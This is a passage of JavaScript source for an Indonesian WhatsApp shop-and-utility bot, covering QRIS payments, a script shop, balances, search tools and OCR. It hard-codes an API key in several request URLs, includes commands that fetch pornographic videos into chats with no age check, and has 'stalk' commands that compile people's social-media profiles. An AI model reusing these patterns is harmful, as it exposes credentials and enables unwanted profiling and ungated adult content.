    if (!produk) return Reply('❌ Kode produk tidak ditemukan dalam daftar.');

    // Proses pembayaran melalui API Order Kuota
    let hargaProduk = parseInt(produk.hargaproduk);
    let uniqueAmount = hargaProduk + generateRandomNumber(110, 250);
    let getPayment = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${uniqueAmount}&codeqr=${global.QrisOrderKuota}`);

    let paymentInfo = getPayment.data.result;
    let teksPembayaran = `
*📌 INFORMASI PEMBAYARAN*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(paymentInfo.amount)}
*• Produk:* ${produk.namaproduk}
*• Kode Produk:* ${produk.kodeproduk}
*• Expired:* 5 menit

⚠️ *Note:*  
- Qris pembayaran hanya berlaku dalam 5 menit.  
- Jika melewati batas waktu, pembayaran dianggap tidak valid!  
- Jika pembayaran berhasil, bot akan mengirim notifikasi status transaksi.

Ketik *.batalbeli* untuk membatalkan pembelian.
`;

    let msgQr = await TamaMods.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }],
      headerType: 1,
      viewOnce: true,
      image: { url: paymentInfo.qrImageUrl },
      caption: teksPembayaran,
      contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi ke database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].pembelian = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: paymentInfo.transactionId,
      amount: paymentInfo.amount.toString(),
      kodeproduk: produk.kodeproduk,
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit) {
            await TamaMods.sendMessage(db.users[m.sender].pembelian.chat, { text: "⚠️ Qris pembayaran telah expired!" }, { quoted: db.users[m.sender].pembelian.msg });
            await TamaMods.sendMessage(db.users[m.sender].pembelian.chat, { delete: db.users[m.sender].pembelian.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].pembelian;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].pembelian.exp();

    // Cek pembayaran secara berkala
    while (db.users[m.sender].status_deposit) {
      await sleep(8000);
      let resultCek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
      let req = resultCek.data;

      if (req?.amount == db.users[m.sender].pembelian.amount) {
        db.users[m.sender].status_deposit = false;
        delete db.users[m.sender].pembelian;

        await TamaMods.sendMessage(m.sender, { text: `
✅ *PEMBAYARAN BERHASIL!*

*• ID Transaksi:* ${paymentInfo.transactionId}
*• Total Pembayaran:* Rp${await toIDR(req.amount)}
*• Produk:* ${produk.namaproduk}
*• Kode Produk:* ${produk.kodeproduk}
`});
      }
    }
  } catch (error) {
    console.error("Error saat memproses pembelian:", error);
    Reply('❌ Terjadi kesalahan saat memproses pembelian.');
  }
}
break;
//----------(Batas Case)----------//
case 'editproduk': {
  if (!isCreator) return Reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return Reply('❌ Masukkan data produk dengan format: kodeproduk|namaproduk|hargaproduk|deskripsiproduk');
  }

  let [kodeproduk, namaproduk, hargaproduk, deskripsiproduk] = input;

  // Pastikan harga adalah angka
  hargaproduk = parseFloat(hargaproduk);

  if (isNaN(hargaproduk)) {
    return Reply('❌ Harga harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./Access/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk ada dalam daftar
    let produkIndex = daftarProduk.findIndex(item => item.kodeproduk === kodeproduk);
    if (produkIndex === -1) {
      return Reply('❌ Kode produk tidak ditemukan dalam daftar.');
    }

    // Update data produk
    daftarProduk[produkIndex] = {
      kodeproduk,
      namaproduk,
      hargaproduk,
      deskripsiproduk
    };

    // Simpan kembali ke file JSON
    fs.writeFileSync('./Access/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    Reply(`✅ Produk berhasil diperbarui:\nKode: ${kodeproduk}\nNama: ${namaproduk}\nHarga: ${hargaproduk}\nDeskripsi: ${deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat mengedit produk:", error);
    Reply('❌ Terjadi kesalahan saat mengedit produk.');
  }
}
break;

case 'listscript': case 'listsc': {
  const scriptPath = './System/database/scripts.json';
  const scriptFolder = './System/media/scripts/';
  try {
      let scriptsData = { scripts: [] };

      try {
          scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
      } catch (parseError) {
          return Reply("❌ *Belum ada script yang tersimpan.*");
      }

      if (!scriptsData.scripts || scriptsData.scripts.length === 0) {
          return Reply("❌ *Tidak ada script yang tersedia.*\nTambahkan script dengan cara ketik *.addscript*");
      }

      const formatFileSize = (bytes) => {
          if (bytes < 1024) return `${bytes} B`;
          if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`;
          return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
      };

      let title = `
─━━━━━━━━━━━━━━━━━━━━━✦✧✦━━━━━━━━━━━━━━━━━━━━━─╮
┃               📜 *List Script Simple Bot Shop* 📜
╰─━━━━━━━━━━━━━━━━━━━━━✦✧✦━━━━━━━━━━━━━━━━━━━━━─╯

📋 *Informasi Produk*
✨ *Bot Auto Response 24 Jam*  
✅ *Produk Asli & Terpercaya*  
💳 *Pembayaran Mudah : QRIS*

🔍 *Pilih script yang sesuai kebutuhan Anda!*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      // Menyiapkan data script
      const scriptRows = scriptsData.scripts.map((script, index) => {
          let fileSize = "Tidak tersedia";
          try {
              const filePath = path.join(scriptFolder, path.basename(script.filePath));
              const size = fs.statSync(filePath).size;
              fileSize = formatFileSize(size);
          } catch (sizeError) {
              console.error('File size error:', sizeError);
          }

          return {
              title: `${index + 1}. ${script.name}`,
              description: `📂 Harga : Rp ${script.price.toLocaleString("id-ID")}\n     📦 Ukuran : ${fileSize}`,
              id: `.belistockscript ${script.name}`
          };
      });

      const buttonData = {
          title: "📜 Daftar List Script Simple Bot Shop",
          sections: [{
              title: "📜 Daftar Script",
              rows: scriptRows
          }]
      };

      const footer = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✨ *Simple Bot Shop - Semua kebutuhan digital Anda!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      // Menggunakan function sendList
      await TamaMods.sendList(m.chat, title, footer, buttonData, { quoted: pantek });

  } catch (error) {
      console.error('List Script Error:', error);
      Reply("❌ *Gagal menampilkan daftar script.*");
  }
  break;
}

case 'addscript': case 'addsc': {
if (!isCreator) return Reply(mess.owner);
const scriptPath = './System/database/scripts.json';
const scriptFolder = './System/media/scripts/';

if (!m.quoted) return Reply("❌ *Reply Script Yang Akan Ditambahkan!*");

const documentMessage = m.quoted.message?.documentMessage;
if (!documentMessage) return Reply("❌ *Mana Script Dokumen nya ka?*");

if (documentMessage.mimetype !== 'application/zip') {
return Reply("❌ *File harus berupa ZIP!*");
}

const [name, price, ...descriptionParts] = args;
const description = descriptionParts.join(" ");

if (!name || !price || !description) return Reply("❌ *Format salah!*\n📌 Ketik : .addscript NamaScript Harga DeskripsiScript\n\nContoh : .addscript FinixV5 60000 Script multi tergacor yang bisa melakukan banyak hal");

try {
const media = await downloadMediaMessage( m.quoted, 'buffer', {}, { reuploadRequest: TamaMods.updateMediaMessage });

if (!media) return Reply("❌ *Gagal mendownload file media!*");

const safeFileName = name.replace(/[^a-z0-9]/gi, '_').toLowerCase();
const fileName = `${safeFileName}_${Date.now()}.zip`;
const filePath = path.join(scriptFolder, fileName);

if (!fs.existsSync(scriptFolder)) {
fs.mkdirSync(scriptFolder, { recursive: true });
}
fs.writeFileSync(filePath, media);
let scriptsData = { scripts: [] };
try {
scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));
} catch (parseError) {
console.warn('Could not parse existing scripts database, creating new one');
}
scriptsData.scripts.push({
name: name,
price: parseInt(price),
description: description,
filePath: filePath,
timestamp: Date.now()
});
fs.writeFileSync(scriptPath, JSON.stringify(scriptsData, null, 2));
Reply(`✅ *Script berhasil ditambahkan!*\n📜 *Nama*: ${name}\n💰 *Harga*: Rp ${parseInt(price).toLocaleString()}\n📝 *Deskripsi*: ${description}`);
} catch (error) {
console.error('Download Error:', error);
Reply(`❌ *Gagal menambahkan script: ${error.message}*`);
}
break;
}

case 'infoscript': case 'infosc': {
const scriptPath = './System/database/scripts.json';

// Validasi argumen
if (!args[0] || isNaN(args[0])) {
return Reply("❌ *Berikan nomor script yang valid!*\n_Contoh: .infoscript 1_");
}

const scriptIndex = parseInt(args[0]) - 1;

try {
// Baca database script
let scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));

// Validasi index script
if (scriptIndex < 0 || scriptIndex >= scriptsData.scripts.length) {
return Reply("❌ *Nomor script tidak valid!*");
}

// Ambil script yang dipilih
const script = scriptsData.scripts[scriptIndex];

// Buat pesan detail
let detailMessage = "*📜 DETAIL SCRIPT 📜*\n\n";
detailMessage += `*Nama Script*: ${script.name}\n`;
detailMessage += `*Harga*: Rp ${script.price.toLocaleString()}\n`;
detailMessage += `*Deskripsi*: ${script.description}\n`;
detailMessage += `*Ditambahkan*: ${new Date(script.timestamp).toLocaleDateString()}\n\n`;
detailMessage += "_Hubungi owner untuk pembelian_";

// Kirim detail
Reply(detailMessage);

} catch (error) {
console.error('Info Script Error:', error);
Reply("❌ *Gagal menampilkan detail script.*");
}
break;
}
case 'delscript': case 'delsc': {
if (!isCreator) return Reply(mess.owner);
const scriptPath = './System/database/scripts.json';
const scriptFolder = './System/media/scripts/';

// Cek apakah nomor script disediakan
if (!args[0] || isNaN(args[0])) {
return Reply("❌ *Berikan nomor script yang valid!*\n_Contoh: .delscript 1_");
}

const scriptIndex = parseInt(args[0]) - 1;

try {
// Baca database scripts
let scriptsData = JSON.parse(fs.readFileSync(scriptPath, 'utf-8'));

// Validasi index script
if (scriptIndex < 0 || scriptIndex >= scriptsData.scripts.length) {
return Reply("❌ *Nomor script tidak valid!*");
}

// Ambil detail script yang akan dihapus
const scriptToDelete = scriptsData.scripts[scriptIndex];

// Hapus file script dari folder
try {
const filePath = path.join(scriptFolder, path.basename(scriptToDelete.filePath));
if (fs.existsSync(filePath)) {
fs.unlinkSync(filePath);
}
} catch (fileDeleteError) {
console.error('Error menghapus file:', fileDeleteError);
}

// Hapus script dari database
scriptsData.scripts.splice(scriptIndex, 1);

// Simpan perubahan ke database
fs.writeFileSync(scriptPath, JSON.stringify(scriptsData, null, 2));

// Kirim konfirmasi
Reply(`✅ *Script berhasil dihapus!*\n📜 Nama : ${scriptToDelete.name}\n💰 Harga : Rp ${scriptToDelete.price.toLocaleString()}`);

} catch (error) {
console.error('Delete Script Error:', error);
Reply("❌ *Gagal menghapus script.*");
}
break;
}

//-> Fitur Saldo <-//
case "addsaldo": {
// Cek apakah yang menjalankan adalah creator
if (!isCreator) return Reply("❌ Maaf, hanya owner yang dapat menggunakan perintah ini.");

// Validasi argumen input
const args = m.text.split(" ");
if (args.length < 3) {
return Reply(`Penggunaan: ${prefix}addsaldo nomor nominal\n\nContoh: ${prefix}addsaldo 000 10000`);
}

// Ekstrak nomor dan nominal
const nomorUser = args[1];
const nominal = parseInt(args[2]);
const userJid = `${nomorUser}@s.whatsapp.net`;

// Validasi nomor hp
if (!/^\d+$/.test(nomorUser)) {
return Reply("❌ Nomor hp harus berupa angka!");
}

// Validasi nominal
if (isNaN(nominal) || nominal <= 0) {
return Reply("❌ Nominal saldo harus berupa angka positif!");
}

const saldoFilePath = "./System/saldo.json";

try {
// Baca file saldo
const saldoData = fs.existsSync(saldoFilePath)
? JSON.parse(fs.readFileSync(saldoFilePath, "utf-8"))
: {};

// Update saldo
if (saldoData[userJid]) {
saldoData[userJid] += nominal;
} else {
saldoData[userJid] = nominal;
}

// Simpan perubahan saldo
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await TamaMods.sendMessage(m.chat, {
  text: `✅ Berhasil menambahkan saldo:\n📱 Pengguna: ${nomorUser}\n💰 Nominal: Rp${nominal.toLocaleString()}\n\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`,
  footer: `${footer}`,
  buttons: [
{ buttonId: '.owner', buttonText: { displayText: 'Owner TamaMods' }, type: 1,},
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'message',
sections: [
{
title: 'Pilih Menu',
highlight_label: 'Tama OfficiaL',
rows: [
{ title: "🔹️CEK SALDO", description: "Untuk Cek Saldo Member Anda", id: `.saldo`}, 
{ title: "🔹 PRODUK MENU", description: "Untuk Menampilkan Produk Menu", id: `.produk`},
]}]})}}],
  headerType: 1,
  viewOnce: true,
}, { quoted: pantek });
// Kirim notifikasi ke nomor yang bersangkutan
const notificationMessage = `💰 Informasi Saldo\n\nSaldo Anda telah ditambahkan:\n💵 Nominal: Rp${nominal.toLocaleString()}\n📊 Total Saldo Sekarang: Rp${saldoData[userJid].toLocaleString()}`;

await TamaMods.sendMessage(`${nomorUser}@s.whatsapp.net`, {
text: notificationMessage
});

} catch (error) {
console.error("Error menambah saldo:", error);
Reply("❌ Terjadi kesalahan saat menambah saldo.");
}
}
break
//----------(Batas Case)----------//
case "delsaldo": {
if (!isCreator) return Reply(mess.owner)
try {
const saldoFilePath = "./System/saldo.json";
if (!args[0] || !args[1]) {
return await Reply("⚠️ Format salah! Gunakan: .kurangisaldo nomor nominal\nContoh: .delsaldo 000 5000");
}
const nomor = args[0];
const nominal = parseInt(args[1]);
if (isNaN(nominal) || nominal <= 0) {
return await Reply("⚠️ Nominal harus berupa angka positif!");
}
if (!fs.existsSync(saldoFilePath)) {
return await Reply("⚠️ File saldo tidak ditemukan!");
}
const saldoData = JSON.parse(fs.readFileSync(saldoFilePath, "utf-8") || "{}");

console.log("Data Saldo:", saldoData);
console.log("Nomor Input:", nomor);
const nomorFormat = `${nomor}@s.whatsapp.net`;
if (!saldoData[nomorFormat]) {
return await Reply(`❌ Nomor ${nomorFormat} tidak ditemukan dalam data saldo!`);
}
if (saldoData[nomorFormat] < nominal) {
return await Reply(
`❌ Saldo tidak mencukupi!\n💰 Saldo saat ini: Rp${saldoData[nomorFormat]}`
);
}
saldoData[nomorFormat] -= nominal;
fs.writeFileSync(saldoFilePath, JSON.stringify(saldoData, null, 2));
await Reply(`✅ Saldo berhasil dikurangi!\n💰 Saldo terbaru untuk ${nomorFormat}: Rp${saldoData[nomorFormat]}`);
} catch (error) {
console.error("Error in kurangisaldo:", error);
await Reply("❌ Terjadi kesalahan saat mengurangi saldo!");
}
}
break
//----------(Batas Case)----------//
case 'saldo': {
try {
const userId = m.sender;
let saldoDB;
try {
saldoDB = JSON.parse(fs.readFileSync('./System/saldo.json'));
} catch {
saldoDB = {}
}
if (!saldoDB[userId]) {
saldoDB[userId] = 0;
fs.writeFileSync('./System/saldo.json', JSON.stringify(saldoDB, null, 2));
}
const saldo = saldoDB[userId];
await TamaMods.sendMessage(m.chat, { text: `*乂 Cek Saldo Anda*
💰 *Saldo Anda:* Rp${saldo.toLocaleString('id-ID')}
📌 *Pengguna:* @${userId.split('@')[0]}

*_Bot Whatsapp Finix V5_*`, mentions: [userId] }, { quoted: pantek });
} catch (error) {
console.error("Error on .saldo:", error);
await TamaMods.sendMessage(m.chat, { text: "❌ Terjadi kesalahan saat mengecek saldo. Silakan coba lagi nanti." 
});
}
break;
}

case "gimage": {
if (!text) return Reply(example("anime dark"))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pint = await fetchJson(`https://restapi-v2.simplebot.my.id/search/gimage?q=${text}`)
let pin = pint.result
if (pin.length > 5) await pin.splice(0, 6)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
try {
let imgsc = await prepareWAMessageMedia({ image: {url: a.url}}, { upload: TamaMods.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
} catch {}
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *google*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: pantek})
await TamaMods.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
//------(Batas Case)------//
case "sfile": {
if (!text) return Reply(example('script bot whatsapp'))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/sfile?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Link :* ${res.link}\n\n`
}
await Reply(teks)
}
break
//------(Batas Case)------//
case "xnxx": {
if (!text) return Reply(example('step sister'))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Info :* ${res.info}
* *Link :* ${res.link}\n\n`
}
await Reply(teks)
}
break
//------(Batas Case)------//
case 'xvid': {
				if (!text) return Reply(`*Example :*\n\nXvid Japan\n\n_NOTE_\nStelah Memasukan Japan Dan Muncul URL, Ketik Ulang, Xvid Sertakan URL Nya\n\nXvid URL`);
				if (!text) return Reply('Please provide a search query or a valid Xvideos URL.');
				const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
				try {
					if (isURL) {
						const result = await xvideosdl(text);
						const {
							title,
							url
						} = result.result;
						const response = await fetch(url);
						const buffer = await response.arrayBuffer();
						let msgs = generateWAMessageFromContent(m.chat, {
							viewOnceMessage: {
								message: {
									"messageContextInfo": {
										"deviceListMetadata": {},
										"deviceListMetadataVersion": 2
									},
									interactiveMessage: proto.Message.InteractiveMessage.create({
										body: proto.Message.InteractiveMessage.Body.create({
											text: `Here you go!\nTitle : ${title}`
										}),
										footer: proto.Message.InteractiveMessage.Footer.create({
											text: packname
										}),
										header: proto.Message.InteractiveMessage.Header.create({
											hasMediaAttachment: false,
											...await prepareWAMessageMedia({
												video: Buffer.from(buffer)
											}, {
												upload: TamaMods.waUploadToServer
											})
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
											buttons: [{
												"name": "quick_reply",
												"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
											}],
										}),
										contextInfo: {
											mentionedJid: [m.sender],
											forwardingScore: 999,
											isForwarded: true,
											forwardedNewsletterMessageInfo: {
												newsletterJid: global.idSaluran,
												newsletterName: packname,
												serverMessageId: 143
											}
										}
									})
								}
							}
						}, {
							quoted: pantek
						})
						await TamaMods.relayMessage(m.chat, msgs.message, {})
					} else {
						const results = await xvideosSearch(text);
						if (results.length === 0) {
							Reply('No search results found for the given query.');
						} else {
							const searchResults = results.map((result, index) => {
								return `${index + 1}. *${result.title}*\nDuration : ${result.duration}\nQuality : ${result.quality}\nURL : ${result.url}`;
							}).join('\n\n');
							let msgs = generateWAMessageFromContent(m.chat, {
								viewOnceMessage: {
									message: {
										"messageContextInfo": {
											"deviceListMetadata": {},
											"deviceListMetadataVersion": 2
										},
										interactiveMessage: proto.Message.InteractiveMessage.create({
											body: proto.Message.InteractiveMessage.Body.create({
												text: `*Search Results for "${text}" :*\n\n${searchResults}`
											}),
											footer: proto.Message.InteractiveMessage.Footer.create({
												text: packname
											}),
											header: proto.Message.InteractiveMessage.Header.create({
												hasMediaAttachment: false,
												...await prepareWAMessageMedia({
													image: { url: "https://files.catbox.moe/wbl5er.jpg" }
												}, {
													upload: TamaMods.waUploadToServer
												})
											}),
											nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
												buttons: [{
													"name": "quick_reply",
													"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
												}],
											}),
											contextInfo: {
												mentionedJid: [m.sender],
												forwardingScore: 999,
												isForwarded: true,
												forwardedNewsletterMessageInfo: {
													newsletterJid: global.idSaluran,
													newsletterName: packname,
													serverMessageId: 143
												}
											}
										})
									}
								}
							}, {
								quoted: pantek
							})
							await TamaMods.relayMessage(m.chat, msgs.message, {})
						}
					}
				} catch (error) {
					console.error(error);
					return Reply('Failed To Fetch Xvideos Video Details.');
				}
			};
			break
		

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "npm": case "npmsearch": {
if (!text) return Reply(example('axios'))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* ${res.title}
* ${res.update.split("T")[0]}
* ${res.links.npm}\n\n`
}
await Reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playstore": {
if (!text) return Reply(example('free fire'))
await TamaMods.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/playstore?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.nama}
* *Developer :* ${res.developer}
* *Rating :* ${res.rate}
* *Link :* ${res.link}\n\n`
}
await Reply(teks)
}
break
//------(Batas Case)------//
case "tiktokstalk": case "ttstalk": {
if (!text) return example("username")
try {
const res = await fetchJson(`https://api.neoxr.eu/api/ttstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Nama :* ${res.data.name}
* *Username :* ${res.data.username}
* *Bio :* ${res?.data?.bio || ""}
* *Followers :* ${res.data.followers}
* *Following :* ${res.data.following}
* *Postingan :* ${res.data.posts}
* *Region :* ${res.data.region}
* *Private :* ${res.data.private == true ? "Ya" : "Tidak"}
`
await TamaMods.sendMessage(m.chat, {image: {url: res.data.photo}, caption: teks}, {quoted: pantek})
} catch (err) {
return Reply("Error : "+err)
}
}
break
//------(Batas Case)------//
case "igstalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/igstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Nama :* ${res.data.name}
* *Username :* ${res.data.username}
* *Total Postingan :* ${res.data.post}
* *Followers :* ${res.data.follower}
* *Following :* ${res.data.following}
* *About :* ${res.data.about}
`
await TamaMods.sendMessage(m.chat, {image: {url: res.data.photo}, caption: teks}, {quoted: pantek})
} catch (err) {
return Reply("Error : "+err)
}
}
break
//------(Batas Case)------//
case "ytstalk": case "youtubestalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/ytstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Nama :* ${res.data.name}
* *Subscribers :* ${res.data.subscribers}
* *Total Video :* ${res.data.videos}
* *Description :* ${res.data.description}
* *UrL :* ${res.data.url}
`
await TamaMods.sendMessage(m.chat, {image: {url: res.data.avatar}, caption: teks}, {quoted: pantek})
} catch (err) {
return Reply("Error : "+err)
}
}
break
//------(Batas Case)------//
case "githubstalk": case "ghstalk": {
if (!text) return example("username")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/ghstalk?username=${text}&apikey=zakkigans12`)
const teks = `
* *Username :* ${res.data.login}
* *Nama :* ${res.data.name}
* *Followers :* ${res.data.followers}
* *Following :* ${res.data.following}
* *Bio :* ${res.data.bio}
* *Repository :* ${res.data.public_repos}
* *Type :* ${res.data.type}
* *Company :* ${res.data.company}
* *Blog :* ${res.data.blog}
* *Lokasi :* ${res.data.location}
* *Created At :* ${res.data.created_at}
* *Update At :* ${res.data.updated_at}
`
await TamaMods.sendMessage(m.chat, {image: {url: res.data.avatar_url}, caption: teks}, {quoted: pantek})
} catch (err) {
return Reply("Error : "+err)
}
}
break
//------(Batas Case)------//
case "nulis": {
if (!text) return example("Tama Adalah Dev Ganteng")
try {
let res = await fetchJson(`https://api.neoxr.eu/api/nulis?text=${text}&apikey=zakkigans12`)
const teks = `${mess.done}`
await TamaMods.sendMessage(m.chat, {image: {url: res.data.url}, caption: teks}, {quoted: pantek})
} catch (err) {
return Reply("Error : "+err)
}
}
break
//------(Batas Case)------//
case 'addpendapatan': {
    if (!isCreator) return Reply(mess.owner);

    if (m.quoted || text) {
        const [harga, namaBarang, pembayaran, total, tanggal] = text.split("|").map(v => v.trim());
        // Format: harga|nama barang|pembayaran|total|tanggal

        if (!harga || !namaBarang || !pembayaran || !total || !tanggal) {
            return Reply(`⚠️ *Format salah!* Gunakan:\n${command} harga|nama barang|pembayaran|total|tanggal`);
        }

        const newData = {
            harga: parseInt(harga),
            namaBarang: namaBarang,
            pembayaran: pembayaran,
            total: parseInt(total),
            tanggal: tanggal,
            waktu: getWaktuWIB() // Fungsi untuk mendapatkan waktu dalam WIB
        };

        pendapatanList.push(newData);
        fs.writeFileSync("./System/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

        Reply(`✅ *Berhasil menambahkan pendapatan:*\n` +
                `📦 *Nama Barang*: ${newData.namaBarang}\n` +
                `💰 *Harga*: Rp${newData.harga}\n` +
                `💳 *Pembayaran*: ${newData.pembayaran}\n` +
                `📊 *Total*: Rp${newData.total}\n` +
                `📅 *Tanggal*: ${newData.tanggal}\n` +
                `⏰ *Waktu*: ${newData.waktu}`);
    } else {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} harga|nama barang|pembayaran|total|tanggal`);
    }
}
break;

case 'delpendapatan': {
    if (!isCreator) return Reply(mess.owner);

    const namaBarang = text.trim();
    // Format: nama barang

    if (!namaBarang) {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} nama barang`);
    }

    const index = pendapatanList.findIndex(p => p.namaBarang === namaBarang);

    if (index === -1) {
        return Reply(`❌ *Gagal!* Data dengan nama barang *${namaBarang}* tidak ditemukan.`);
    }

    // Menghapus data pendapatan dari daftar
    const deletedData = pendapatanList.splice(index, 1)[0];
    fs.writeFileSync("./System/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

    Reply(`✅ *Berhasil menghapus pendapatan:*\n` +
            `📦 *Nama Barang*: ${deletedData.namaBarang}\n` +
            `💰 *Harga*: Rp${deletedData.harga}\n` +
            `💳 *Pembayaran*: ${deletedData.pembayaran}\n` +
            `📊 *Total*: Rp${deletedData.total}\n` +
            `📅 *Tanggal*: ${deletedData.tanggal}\n` +
            `⏰ *Waktu*: ${deletedData.waktu}`);
}
break;

case 'listpendapatan': {
    if (!isCreator) return Reply(mess.owner);

    if (pendapatanList.length < 1) {
        return Reply("Tidak ada data pendapatan saat ini. ❌");
    }

    let totalSemua = 0;
    let teksnya = `📜 *DAFTAR PENDAPATAN* 📜\n\n`;

    pendapatanList.forEach((p, i) => {
        teksnya += `➡️ ${i + 1}. 📦 *Nama Barang*: ${p.namaBarang}\n` +
                   `   💰 *Harga*: Rp${p.harga}\n` +
                   `   💳 *Pembayaran*: ${p.pembayaran}\n` +
                   `   📊 *Total*: Rp${p.total}\n` +
                   `   📅 *Tanggal*: ${p.tanggal}\n` +
                   `   ⏰ *Waktu*: ${p.waktu}\n\n`;

        totalSemua += p.total; // Menjumlahkan total pendapatan
    });

    teksnya += `━━━━━━━━━━━━━━━━━━━━\n` +
               `🤑 *TOTAL SEMUA PENDAPATAN*: Rp${totalSemua.toLocaleString("id-ID")}\n`;

    TamaMods.sendMessage(m.chat, { text: teksnya }, { quoted: qtoko });
}
break;

case "deepseek": case "depsek": case "deepsek": {
let talk = text ? text : "Hallo Kamu Siapa ?"
await fetchJson(`https://restapi.simplebot.my.id/ai/deepseek?apikey=${global.apipayment}&text=` + talk).then(async (res) => {
await Reply(res.result)
}).catch(e => Reply(e.toString()))
}
break
//------(Batas Case)------//
case "ocr": {
if (!/image/.test(mime)) return Reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ocr?url=${dd}`)
await TamaMods.sendMessage(m.chat, {text: resnya.result.toString()}, {quoted: pantek})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "removebg": {
if (!/image/.test(mime)) return Reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
